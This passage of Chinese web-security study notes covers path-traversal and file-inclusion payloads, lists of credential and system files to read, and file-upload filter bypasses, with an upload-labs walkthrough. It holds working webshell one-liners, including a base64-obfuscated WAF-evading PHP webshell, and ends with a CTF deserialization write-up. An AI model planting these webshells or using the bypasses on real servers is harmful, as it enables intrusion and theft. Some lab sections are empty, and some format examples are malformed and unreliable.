       - ..%c0%af
       - %c0%ae%c0%ae/
         - 注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）
         - Apache Tomcat Directory Traversal
     - ..\
       - ..%c1%9c

3. 指定后缀

   ```php
   <?php
   	$file = $_GET['file'];
   	include $file.'/test/test.php';
   ?>
   ```

   - 利用协议：

     ```php
     index.php?file=zip://D:\phpStudy\WWW\fileinclude\chybeta.zip%23chybeta
     ```

   - 长度截断

     目录字符串，在Linux下4096字节时会达到最大值，在Windows下256字节会达到最大值。

     ```php
     index.php?file=././././。。。省略。。。././shell.txt
     ```

     后缀省略术

   - 0字节截断

     ```php
     index.php?file=phpinfo.txt%00
     ```

#### 4.关注文件

##### ① Linux环境

```shell
/etc/passwd
/etc/group
/etc/hosts
/etc/motd
/etc/issue
/etc/bashrc
/etc/apache2/apache2.conf
/etc/apache2/ports.conf
/etc/apache2/sites-available/default
/etc/httpd/conf/httpd.conf
/etc/httpd/conf.d
/etc/httpd/logs/access.log
/etc/httpd/logs/access_log
/etc/httpd/logs/error.log
/etc/httpd/logs/error_log
/etc/init.d/apache2
/etc/mysql/my.cnf
/etc/nginx.conf
/opt/lampp/logs/access_log
/opt/lampp/logs/error_log
/opt/lamp/log/access_log
/opt/lamp/logs/error_log
/proc/self/environ
/proc/version
/proc/cmdline
/proc/mounts
/proc/config.gz
/root/.bashrc
/root/.bash_history
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_rsa.keystore
/root/.ssh/id_rsa.pub
/root/.ssh/known_hosts
/usr/local/apache/htdocs/index.html
/usr/local/apache/conf/httpd.conf
/usr/local/apache/conf/extra/httpd-ssl.conf
/usr/local/apache/logs/error_log
/usr/local/apache/logs/access_log
/usr/local/apache/bin/apachectl
/usr/local/apache2/htdocs/index.html
/usr/local/apache2/conf/httpd.conf
/usr/local/apache2/conf/extra/httpd-ssl.conf
/usr/local/apache2/logs/error_log
/usr/local/apache2/logs/access_log
/usr/local/apache2/bin/apachectl
/usr/local/etc/nginx/nginx.conf
/usr/local/nginx/conf/nginx.conf
/var/apache/logs/access_log
/var/apache/logs/access.log
/var/apache/logs/error_log
/var/apache/logs/error.log
/var/log/apache/access.log
/var/log/apache/access_log
/var/log/apache/error.log
/var/log/apache/error_log
/var/log/httpd/error_log
/var/log/httpd/access_log
/var/log/nginx/access_log
/var/log/nginx/access.log
/var/log/nginx/error_log
/var/log/nginx/error.log
```

##### ② Windows环境

```tiki wiki
C:\boot.ini
C:\windows\system32\inetsrv\MetaBase.xml
C:\windows\repair\sam
C:\Program Files\mysql\my.ini
C:\Program Files\mysql\data\mysql\user.MYD
C:\windows\php.ini
C:\windows\my.ini
```





### 05. **CSRF 跨站请求伪造**

跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以 CSRF 攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF 可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时 CSRF 则可能威胁到整个 WEB 系统的安全。

1. 尽量使用POST
2. 加验证码
3. 验证Referer
4. Anti CSRF Token 服务器随机产生，唯一的
5. 加入自定义Header

















### 06. **SSRF 服务器端请求伪造**

SSRF（Server-Side Request Forgery：服务器端请求伪造）是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是==从外网无法访问的内部系统==。



### 07. **文件上传**

在网站的运营过程中，不可避免地要对网站的某些页面或者内容进行更新，这时便需要使用到网站的==文件上传==的功能。如果不对被上传的文件进行限制或者限制被绕过，该功能便有可能会被利用于上传可执行文件、脚本到服务器上，进而进一步导致服务器沦陷。

一些经典的位置都可以让你把文件给上传到服务器上，但是通常有一些检测流程，建议从流程开始出发，针对性的面对检测上传文件。

#### 1.基础知识：

* PHP Server

  ```powershell
  .php
  .php3
  .php4
  .php5
  .php7
  
  # Less known PHP extensions
  .pht
  .phps
  .phar
  .phpt
  .pgif
  .phtml
  .phtm
  .inc
  ```

* ASP Server : `.asp, .aspx, .cer and .asa (IIS <= 7.5), shell.aspx;1.jpg (IIS < 7.0)`

* JSP : `.jsp, .jspx, .jsw, .jsv, .jspf`

* Perl: `.pl, .pm, .cgi, .lib`

* Coldfusion: `.cfm, .cfml, .cfc, .dbm`

##### ① 上传欺骗

- 使用双扩展名 : `.jpg.php`

- 使用反向双扩展（有助于利用Apache错误配置，其中任何扩展名为.php但不一定以.php结尾的内容都将执行代码）: `.php.jpg`

- 大小写混合 : `.pHp, .pHP5, .PhAr`

- 0字节 (works well against `pathinfo()`)

  * .php%00.gif
  * .php\x00.gif
  * .php%00.png
  * .php\x00.png
  * .php%00.jpg
  * .php\x00.jpg

- 特殊字符

  * 文件后缀多点过滤 : `file.php......` ,在Windows中，创建文件时，文件末尾的点将被删除。
  * 空白字符: `file.php%20`
  * 从右到左解析 (RTLO): `name.%E2%80%AEphp.jpg` 会变成 `name.gpj.php`.

- Mime 类型, 更改 Content-Type : application/x-php ` or ` Content-Type : application/octet-stream` to `Content-Type : image/gif`

  * `Content-Type : image/gif`
  * `Content-Type : image/png`
  * `Content-Type : image/jpeg`
  * 设置内容类型两次：一次用于不允许的类型，一次用于允许的类型。

- 魔法字节

  有些时候应用程序是根据第一个特征字符来识别文件类型的。在文件中添加或者替换特殊字符可能可以欺骗应用程序。

  * * PNG: `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[`
    * JPG: `\xff\xd8\xff`
    * GIF: `GIF87a` OR `GIF8;`
  * Shell can also be added in the metadata

- 在Windows中使用NTFS备用数据流（ADS）。在这种情况下，冒号字符“：”将插入禁止的扩展名之后和允许的扩展名之前。因此，将在服务器上创建具有禁止扩展名的空文件（例如“`file.asax:.jpg`”）。稍后可以使用其他技术（如使用其短文件名）编辑此文件。“：$data”模式也可用于创建非空文件。因此，在此模式后添加点字符可能有助于绕过进一步的限制（.例如“`file.asp::$data.`”）

#### 2.上传检测：

- 客户端JavaScript检测 (通常为检测文件扩展名)

  举例：

  ```js
  function check()
  {
    var filename = document.getElementById("file");
    var str = filename.value.split(".");
    var ext = str[str.length-1];
    if(ext=='jpg'||ext=='png'||ext=='jpeg'||ext=='gif')
    {
      return true;
    }
    else
    {
      alert("仅允许上传png/jpeg/gif类型的文件！")
      return false;
    }
    return false;
  }
  ```

  **绕过方法**：

  - 上传页面，审查元素，修改JavaScript检测函数；
  - 将需要上传的恶意代码文件类型改为允许上传的类型，例如将dama.asp改为dama.jpg上传，配置Burp Suite代理进行抓包，然后再将文件名dama.jpg改为dama.asp。
  - 上传webshell.jpg.jsp，可能前端程序检查后缀时，从前面开始检查

- 服务端MIME类型检测 (检测Content-Type内容)

  举例：

  ```php
  <?php
    if($_FILES['userfile']['type']!="image/gif")
    {//检测Content-type
      echo"Sorry,weonlyallowuploadingGIFimages";
  	exit;
    }
    $uploaddir='uploads/';
    $uploadfile=$uploaddir.basename($_FILES['userfile']['name']);
    if(move_uploaded_file($_FILES['userfile']['tmp_name'],$uploadfile))
    {
      echo"Fileisvalid,andwassuccessfullyuploaded.\n";
    }
    else
    {
      echo"Fileuploadingfailed.\n";
    }
  ?>
  ```

  **绕过方法**：配置Burp Suite代理进行抓包，将Content-Type修改为image/gif，或者其他允许的类型。

- 服务端目录路径检测 (检测跟Path参数相关的内容)

  常见于asp系统

  **绕过方法**：

  例如path参数为如下“upfile/”，可以尝试修改为“upfile.asp/”或者“upfile/1.asp/”或者“upfile/1.asp;.”，注意观察返回的文件名。返回的文件名可能为：upfile/1.asp;.201704117886.jpg，满足IIS6.0解析漏洞。

- 服务端文件扩展名检测 (检测跟文件extension相关的内容)

  服务器端设置了上传文件的黑白名单，

  **绕过方法**：

  - 文件名大小写绕过：
    使用Asp、PhP之类的文件名绕过黑名单检测

  - 名单列表绕过：
    用黑名单里没有的名单进行攻击，比如很名单中没有的asa或者cer之类

  - 特殊文件名绕过：
    比如在发送的HTTP包中，将文件名改为”dama.asp.”或者”dama.asp_”(下划线为空格)，这种命名方式在window系统里是不被允许的，所以需要在Burp Suite中抓包修改，上传之后，文件名会被window自动去掉后面的点或者空格，需要注意此种方法仅对window有效，Unix/Linux系统没有这个特性。

  - 0x00截断绕过：

    上传dama.jpg，Burp抓包，将文件名改为dama.php%00.jpg，选中%00，进行url-decode。

  - 上传.htaccess文件攻击：（适用于黑名单检测方式，黑名单中未限制.htaccess）
    该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。

  - 解析漏洞绕过
    直接上传一个注入过恶意代码的非黑名单文件即可，再利用解析漏洞利用。

- 服务端文件内容检测 (检测内容是否合法或含有恶意代码)

  - 文件幻数检测：

    JPG ： FF D8 FF E0 00 10 4A 46 49 46
    GIF ： 47 49 46 38 39 61 (GIF89a)
    PNG： 89 50 4E 47
    **绕过方法**：
    在文件幻数后面加上自己的一句话木马就行了。

  - 文件相关信息检测：
    一般就是检查图片文件的大小，图片文件的尺寸之类的信息。
    **绕过方法**：
    伪造好文件幻数，在后面添加一句话木马之后，再添加一些其他的内容，增大文件的大小。

  - 文件加载检测：
    这个是最变态的检测，一般是调用API或者函数去进行文件加载测试，常见的是图像渲染测试，再变态一点的甚至是进行二次渲染。
    **绕过方法**：
    针对渲染加载测试：代码注入绕过
    针对二次渲染测试：攻击文件加载器

  通常对于文件内容检查的绕过，就是直接用一个结构完整的文件进行而已代码注入即可。

#### 3.Web Server漏洞

##### ① Apache解析漏洞：

就是当存在一个文件为xxx.x1.x2.x3的文件的时候：

会先从后到前开始解析，如果x3不属于Apache解析的拓展名，那么会推前解析，直到遇到一个可以解析的文件名为止。

Apache2.0.x<=2.0.59
Apache2.2.x<=2.2.17

一般基础漏洞仅存在于低版本中，一般不予考虑。

##### ② IIS解析漏洞：

###### IIS6.0

- 文件类型
  正常：www.xxx.com/logo.jpg
  触发漏洞：www.xxx.com/logo.asp;.jpg
  按照Ⅰ来访问logo.jpg，文件会被当成是jpg图片来解析，想办法，能够按照Ⅱ来访问logo.jpg，文件就会被当成asp文件来处理。（如果IIS支持PHP，那么logo.php;.jpg也会被当成PHP文件执行）
- 文件夹类型
  正常：www.xxx.com/image/logo.jpg
  触发漏洞：www.xxx.com/image.asp/logo.jpg
  按照Ⅰ来访问logo.jpg，文件会被当成是jpg图片来解析，想办法，能够按照Ⅱ来访问logo.jpg，文件就会被当成asp文件来处理。（如果IIS支持PHP，那么image.php文件夹下的文件也会被当做PHP文件解析。）

###### IIS7.0以上

IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串”/任意文件名.php”就会按照php的方式去解析。（例如：webshell.jpg/x.php）
IIS7.0(Win2008R1+IIS7.0)
IIS7.5(Win2008R2+IIS7.5)
IIS的解析漏洞不像Apache那么模糊，针对IIS6.0，只要文件名不被重命名基本都能搞定。这里要注意一点，对于”任意文件名/任意文件名.php”这个漏洞其实是出现自php-cgi 的漏洞， 所以其实跟IIS自身是无关的。

###### Nginx解析漏洞

- 一个是对任意文件名，在后面添加”/任意文件名.php”的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击；
- 低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击；

#### 4.文件上传防御：

- 轻量级检测必然能绕过
- 检测的重点放在文件内容检测
- 路径/扩展名检测一定要用白名单
- 不能有本地文件包含漏洞
- 随时注意更新Web应用软件

一句话木马：

```shell
php  :  <?php @eval($_POST[‘lzx’]);?>
     :  <?php  $a = "a"."s"."s"."e"."r"."t";$a($_POST[cc]);?>
asp  :  <% eval request(“lzx”)%>
aspx :  <%@ Page Language="Jscript"%><%eval(Request.Item["lzx"],"unsafe");%>
```

PHP一句话：

```php
<?php 
  $mt="JF9QT1N"; 
  $ojj="QGV2YWwo";
  $hsa="UWydpMGle";
  $fnx="5BeSleleddKTs=";
  $zk = str_replace("d","","sdtdrd_redpdldadcde");
  $ef = $zk("z", "", "zbazsze64_zdzeczodze");  
  $dva = $zk("p","","pcprpepaptpe_fpupnpcptpipopn");                                           
  $zvm = $dva('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx))); 
  $zvm(); 
?>
```

过狗一句话总结为：打乱字符、编码技术、拆分组合、创建、匹配；

图片木马制作：(Linux环境下)

```shell
copy /b 1.jpg+2.php
```

#### 5.测试方法：

- 关掉上传文件的功能
  如果Web应用程序不需要上传文件的功能，则可以直接将上传文件的功能关闭来避免不必要的麻烦。打开“php.ini”文件，找到file uploads的位置，将file_uploads设置成Off。
- 限制能够上传的文件大小
  如果黑客采取连续不断地上传文件，或是上传极大的文件，来使Web应用程序没有更多资源来处理其他来访者的请求，黑客就可以借此来瘫痪网站。PHP的限制机制可以让您限制允许上传文件体积的最大值，来避免来访者上传太大的文件。单独POST请求的最大值，可以使用php.ini文件的upload_max_size来设置。打开“php.ini”文件，找到upload_max_size的位置，将upload_max_size设置成想要的值。
- 检查上传文件的类型
- 检查上传文件的内容
- 上传的文件不要保存在公开的文件夹内，以避免被黑客直接读取。另外将文件的路径隐藏起来，或是将文件名称改成没有扩展名的随机文件名，都可以增加上传文件的安全性。

1. 上传jpg文件，抓包修改文件类型为脚本格式（asp、aspx、php、jsp等）。
2. 有些应用检测上传文件类型时，通过文件名中的第一个‘.’来分割文件后缀名，所以可以尝试上传xxx.jpg.php(asp、aspx、jsp等)。

#### 6.文件上传训练场([Releases · c0ny1/upload-labs · GitHub](https://github.com/c0ny1/upload-labs/releases))

下载release版本，然后直接开启即可

先创建一个php文件作为上传的文件

```php
<?php phpinfo(); ?>
```

##### Pass-01（JS代码审计）

前端JavaScript代码审计

[![5S51jP.png](https://z3.ax1x.com/2021/10/07/5S51jP.png)](https://imgtu.com/i/5S51jP)

修改前端代码即可上传。

##### Pass-02（HTTP报文检查）

先照常上传文件，然后发现它弹出这种报错：

[![5S50cq.png](https://z3.ax1x.com/2021/10/07/5S50cq.png)](https://imgtu.com/i/5S50cq)

猜测可能是对`Content-Type`进行了验证

打开Burp Suite抓包试试，并且进行修改：

[![5SIpb8.png](https://z3.ax1x.com/2021/10/07/5SIpb8.png)](https://imgtu.com/i/5SIpb8)

将Content-Type改为 image/jpeg ，即可上传成功

##### Pass-03（上传特殊可解析后缀）

第三关了，报出不允许上传.asp,.aspx,.php,.jsp后缀文件！这样的错误，应该是PHP进行了黑名单的检测。

可以试一下phtml以及php3

可以发现上传成功！

[![5SqYMd.png](https://z3.ax1x.com/2021/10/07/5SqYMd.png)](https://imgtu.com/i/5SqYMd)

##### Pass-04（上传.htaccess）

都第四关了，它应该丧心病狂把所有可以限制的文件后缀都给加入黑名单了，查看源码，果不其然！！

```php
$deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
```

那就要想到我们的，欸？它好像没有禁止.htaccess

那我们可以操作一番：

先创建个文件 .htaccess

```txt
SetHandler application/x-httpd-php
```

然后直接上传，这个文件会默认把所有文件解析为php

然后直接上传木马php文件，并且依旧更改filename，

[![5SOpNV.png](https://z3.ax1x.com/2021/10/07/5SOpNV.png)](https://imgtu.com/i/5SOpNV)

然后直接访问index.gif就可以看到info了！！！

##### Pass-05（后缀大小写绕过）

看到这一关，好了，它真的把所有文件都给禁了！连.htaccess也不例外！！

但是，它竟然没有进行大小写的约束！！

那就直接操作filename就可以了！

[![5SOOPK.png](https://z3.ax1x.com/2021/10/07/5SOOPK.png)](https://imgtu.com/i/5SOOPK)

直接上传访问即可！

##### Pass-06（后缀空格绕过）

又上升了一个难度，对全部后缀实行黑名单，并且还有大小写的黑名单。

```php
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
```

但是它没有对后缀空格进行过滤，所以直接在文件filename后面加一个空格即可！！

[![5SX8RU.png](https://z3.ax1x.com/2021/10/07/5SX8RU.png)](https://imgtu.com/i/5SX8RU)

##### Pass-07（后缀点绕过）

黑名单与大小写禁用还有空格过滤，难度激增，但想到Windows下，好像有后缀.绕过这一说法，那就试一下！！

[![5SjdXQ.png](https://z3.ax1x.com/2021/10/07/5SjdXQ.png)](https://imgtu.com/i/5SjdXQ)

果然可以，成功了！！但没试过Linux下的hh

##### Pass-08（后缀::$DATA绕过）

这关不知道，上网查了之后发现Windows特性，后缀可以加上"::$DATA"进行绕过：

[![5SjTtx.png](https://z3.ax1x.com/2021/10/07/5SjTtx.png)](https://imgtu.com/i/5SjTtx)

Windows没有太过于了解，所以不会做！！！Linux才是强项hh

##### Pass-09（配合绕过）

进行代码审计，发现：

```php
  $img_path = UPLOAD_PATH.'/'.$file_name;
```

这可以利用它的过滤进行上传

[![5SvlgU.png](https://z3.ax1x.com/2021/10/07/5SvlgU.png)](https://imgtu.com/i/5SvlgU)

构造的是： 文件.php. .

后面是（点+空格+点）

经过过滤后，又变为文件.php

上传成功！！

##### Pass-10（双名后缀绕过）

审计源代码，可以发现：

```php
  $file_name = str_ireplace($deny_ext,"", $file_name);
```

它将问题后缀转变为空，那么我们可以进行操作

```
pphphp
```

双写绕过

[![5SxGz8.png](https://z3.ax1x.com/2021/10/07/5SxGz8.png)](https://imgtu.com/i/5SxGz8)

上传成功！！！

##### Pass-11（%00绕过）

老样子，审计一波

```php
     $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```

拼接，可以用古老的%00截断



上传成功！！！

##### Pass-12

##### Pass-13

##### Pass-14

##### Pass-15

##### Pass-16

##### Pass-17

##### Pass-18

##### Pass-19

##### Pass-20

### 08. **点击劫持**

Clickjacking（点击劫持）是由互联网安全专家罗伯特 · 汉森和耶利米 · 格劳斯曼在 2008 年首创的。

是一种==视觉欺骗手段==，在 WEB 端就是 iframe 嵌套一个透明不可见的页面，让用户在不知情的情况下，点击攻击者想要欺骗用户点击的位置。

由于点击劫持的出现，便出现了反 iframe 嵌套的方式，因为点击劫持需要 iframe 嵌套页面来攻击。

下面代码是最常见的防止 frame 嵌套的例子：

```
if(top.location!=location)
    top.location=self.location;
```

### 09. **VPS 虚拟专用服务器**

VPS（Virtual Private Server 虚拟专用服务器）技术，将一部服务器分割成多个虚拟专享服务器的优质服务。实现 VPS 的技术分为容器技术，和虚拟化技术。在容器或虚拟机中，每个 VPS 都可分配独立公网 IP 地址、独立操作系统、实现不同 VPS 间磁盘空间、内存、CPU 资源、进程和系统配置的隔离，为用户和应用程序模拟出独占使用计算资源的体验。VPS 可以像独立服务器一样，重装操作系统，安装程序，单独重启服务器。VPS 为使用者提供了管理配置的自由，可用于企业虚拟化，也可以用于 IDC 资源租用。

IDC 资源租用，由 VPS 提供商提供。不同 VPS 提供商所使用的硬件 VPS 软件的差异，及销售策略的不同，VPS 的使用体验也有较大差异。尤其是 VPS 提供商超卖，导致实体服务器超负荷时，VPS 性能将受到极大影响。相对来说，容器技术比虚拟机技术硬件使用效率更高，更易于超卖，所以一般来说容器 VPS 的价格都低于虚拟机 VPS 的价格。

### 10. **条件竞争**

条件竞争漏洞是一种==服务器端的漏洞==，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。

### 11. **XXE**

XXE Injection 即 XML External Entity Injection，也就是==XML 外部实体注入攻击==. 漏洞是在对非安全的外部实体数据进⾏行处理时引发的安全问题。

在 XML 1.0 标准里，XML 文档结构⾥里定义了实体（entity）这个概念. 实体可以通过预定义在文档中调用，实体的标识符可访问本地或远程内容. 如果在这个过程中引入了「污染」源，在对 XML 文档处理后则可能导致信息泄漏等安全问题。

### 12. **XSCH**

由于网站开发者在使用 Flash、Silverlight 等进行开发的过程中的疏忽，没有对==跨域策略文件==（crossdomain.xml）进行正确的配置导致问题产生。 例如：

```
<cross-domain-policy>
    <allow-access-from domain=“*”/>
</cross-domain-policy>
```

因为跨域策略文件配置为 `*`，也就指任意域的 Flash 都可以与它交互，导致可以发起请求、获取数据。

### 13. **越权（功能级访问缺失）**

越权漏洞是 WEB 应用程序中一种常见的安全漏洞。它的威胁在于一个账户即可控制全站用户数据。当然这些数据仅限于存在漏洞功能对应的数据。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。所以测试越权就是和开发人员拼细心的过程。

### 14. **敏感信息泄露**

敏感信息指不为公众所知悉，具有实际和潜在利用价值，丢失、不当使用或未经授权访问对社会、企业或个人造成危害的信息。包括：个人隐私信息、业务经营信息、财务信息、人事信息、IT 运维信息等。 泄露途径包括 Github、百度文库、Google code、网站目录等。

### 15. **错误的安全配置**

Security Misconfiguration：有时候，使用默认的安全配置可能会导致应用程序容易遭受多种攻击。在已经部署的应用、WEB 服务器、数据库服务器、操作系统、代码库以及所有和应用程序相关的组件中，都应该使用现有的最佳安全配置，这一点至关重要。

### 16. **请求走私**

在 HTTP 协议中，存在两种 Header 来指定请求的结尾，分别是 Content-Length 以及 Transfer-Encoding。在复杂的网络环境下，不同的服务器以不同的方式实现 RFC 标准。因此，相同的 HTTP 请求，不同的服务器可能会产生不同的处理结果，这样就产生了了安全风险。

### 17. **TLS 投毒**

在 TLS 协议中，存在一种会话复用机制，当支持该类特性的客户端访问了恶意 TLS 服务器后，客户端会存储恶意服务器下发的 Session ，在客户端重用会话时，配合 DNS Rebinding 可以实现让客户端发送恶意 Session 至内网服务，从而达到 SSRF 攻击效果，包括可以任意写入 Memcached 等内网服务，进而配合其他漏洞造成 RCE 等危害。

### 18. **XS-Leaks**

跨站脚本泄漏（又称 XS-Leaks/XSLeaks），是一类利用 Web 平台内置的侧信道衍生出来的漏洞。其原理是利用网络上的这种侧信道来揭示用户的敏感信息，如用户在其他网络应用中的数据、用户本地环境信息，或者是用户所连接的内部网络信息等。

该攻击利用了 Web 平台的核心原则 -- 可组合性，即允许网站之间相互作用，并滥用合法机制来推断用户的信息。该攻击与跨站请求伪造（CSRF）技术主要区别在于 XS-Leaks 并不伪造用户请求执行操作，而是用来推断、获取用户信息。

浏览器提供了各种各样的功能来支持不同 Web 应用程序之间的互动；例如，浏览器允许一个网站加载子资源、导航或向另一个应用程序发送消息。虽然这些行为通常受到网络平台的安全机制的限制（例如同源政策），但 XS-Leaks 利用了网站之间互动过程中的各种行为来泄露用户信息。

### 19. **WAF**

Web 应用防护系统（也称：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。利用国际上公认的一种说法：WEB 应用防火墙是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 WEB 应用提供保护的一款产品。

### 20. **IDS**

IDS 是英文 Intrusion Detection Systems 的缩写，中文意思是「入侵检测系统」。专业上讲就是依照一定的安全策略，通过软、硬件，对网络、系统的运行状况进行监视，尽可能发现各种攻击企图、攻击行为或者攻击结果，以保证网络系统资源的机密性、完整性和可用性。做一个形象的比喻：假如防火墙是一幢大楼的门锁，那么 IDS 就是这幢大楼里的监视系统。一旦小偷爬窗进入大楼，或内部人员有越界行为，只有实时监视系统才能发现情况并发出警告。

### 21. **IPS**

入侵防御系统（IPS：Intrusion Prevention System）是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙（Packet Filter，Application Gateway）的补充。入侵预防系统（Intrusion-prevention system）是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。

### 22.序列化与反序列化

#### 1.PHP

```php
<?php 
class wllm{ public $admin="admin"; public $passwd="ctf"; } 
$a=new wllm(); 
echo serialize($a); 
?>
```

```
O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
```

序列化与反序列化直接上代码跑答案就可以了！！

##### ① 反序列化漏洞：

（反）序列化给我们传递对象提供一种简单的方法：

serialize（）将一个对象转换成一个字符串

unserialize（）将字符串还原为一个对象

魔术方法：

```php
__construct(), __destruct()
__call(), __callStatic()
__get(), __set()
__isset(), __unset()
__sleep(), __wakeup()
__toString()
__invoke()
__set_state()
__clone()
__debugInfo()
```

**_destruct()  在对象被销毁时程序会自动调用**

**_wakeup()  在类对象被反序列化时被调用**

反序列化时，只要对象大于被传值时就可以绕过wakeup（）！！

```json
O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
O:4:"wllm":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
```

反序列化的数据本质上来说是没有危害的，用户可控才是危害

##### ② 反序列化格式：

- boolean

  ```php
  b:;
  b:1; // True
  b:0; // False
  ```

- integer

  ```php
  i:;
  i:1; // 1
  i:-3; // -3
  ```

- double

  ```php
  d:;
  d:1.2345600000000001; // 1.23456（php弱类型所造成的四舍五入现象）
  ```

- NULL

  ```php
  N; //NULL
  ```

- string

  ```php
  s::"";
  s"INSOMNIA"; // "INSOMNIA"
  ```

- array

  ```php
  a::{key, value pairs};
  a{s"key1";s"value1";s"value2";} // array("key1" => "value1", "key2" => "value2")
  ```

##### ③ 案例：

###### Ⅰ easySerialize

**来源：** 信安-校内网-在线靶场-新手题

[![IREBQ0.png](https://z3.ax1x.com/2021/11/15/IREBQ0.png)](https://imgtu.com/i/IREBQ0)

经典的easy，好，我们点进去看一下是有多么的easy（多半都是骗人的）

这道题对于新手而言，较为综合性，考察点包含**robots.txt+PHP伪协议读取+PHP序列化与反序列化+PHP文件命令**

来看看，你会多少吧！！0-..-0



[![IREvlt.png](https://z3.ax1x.com/2021/11/15/IREvlt.png)](https://imgtu.com/i/IREvlt)

我们直接`/robots.txt`进行访问：

[![IRZHGd.png](https://z3.ax1x.com/2021/11/15/IRZHGd.png)](https://imgtu.com/i/IRZHGd)

然后看到这个，直接将`/robots.txt`删掉换成`/this_Is_1nclude.php`

然后看到了这个：

[![IReizn.png](https://z3.ax1x.com/2021/11/15/IReizn.png)](https://imgtu.com/i/IReizn)

```php
<?php
$file = @$_GET["file"]?:null;
if(isset($file)){
    include $file.'.php';
}
else{
    highlight_file(__FILE__);
}
?>
```

看到这里，我还以为是普通的文件包含，但一想，它题目不是打着序列化的名头嘛？

试了一下，

```html
?file=flag
?file=flag%00
?file=index
```

都没有什么卵用！

然后就想到伪协议读取！

```php
/this_Is_1nclude.php?file=php://filter/read=convert.base64-encode/resource=index
```

base64解码：

```base64
PD9waHAKCiAgICBjbGFzcyBXZWxjb21lewogICAgICAgIHB1YmxpYyAkdGVzdDsKICAgICAgICBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpewogICAgICAgICAgICAkdGhpcy0+dGVzdCA9IG5ldyBBdXJvcmEoKTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIF9fZGVzdHJ1Y3QoKXsKICAgICAgICAgICAgJHRoaXMtPnRlc3QtPmFjdGlvbigpOwogICAgICAgIH0KICAgIH0KCiAgICBjbGFzcyBjY3sKICAgICAgICBwdWJsaWMgJGNvZGU7CiAgICAgICAgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKXsKICAgICAgICAgICAgJHRoaXMtPmNvZGUgPSAiZmxhZ19pc19oZXJlIjsKICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24gYWN0aW9uKCl7CiAgICAgICAgICAgIGV2YWwoJHRoaXMtPmNvZGUpOwogICAgICAgIH0KICAgIH0KCiAgICBjbGFzcyBBdXJvcmF7CiAgICAgICAgZnVuY3Rpb24gYWN0aW9uKCl7CiAgICAgICAgICAgIGVjaG8gIndlbGNvbWUgdG8gYXVyb3JhQ1RGIjsKICAgICAgICB9CiAgICB9CiAgICAkY29kZSA9IEAkX0dFVFsnY29kZSddPzpudWxsOwogICAgaWYoaXNzZXQoJGNvZGUpKXsKICAgICAgICB1bnNlcmlhbGl6ZSgkY29kZSk7CiAgICB9CiAgICBlbHNlewogICAgICAgICRjYyA9IG5ldyBXZWxjb21lKCk7CiAgICAgICAgZWNobyAi5L2g55+l6YGT5LuA5LmI5pivcm9ib3Rz5Y2P6K6u5ZCXPzxicj4iOwogICAgfQo/Pgo=
```

解码之后就得到了index.php文件了，进行经典的代码审计：

```php
<?php

class Welcome{
    public $test;
    function __construct(){
        $this->test = new Aurora();
    }

    function __destruct(){
        $this->test->action();
    }
}

class cc{
    public $code;
    function __construct(){
        $this->code = "flag_is_here";
    }
    function action(){
        eval($this->code);
    }
}

class Aurora{
    function action(){
        echo "welcome to auroraCTF";
    }
}
$code = @$_GET['code']?:null;
if(isset($code)){
    unserialize($code);
}
else{
    $cc = new Welcome();
    echo "你知道什么是robots协议吗?<br>";
}
?>
```

首先我们先总体看一下主函数在哪里？

```php
$code = @$_GET['code']?:null;
if(isset($code)){
    unserialize($code);
}
else{
    $cc = new Welcome();
    echo "你知道什么是robots协议吗?<br>";
}
```

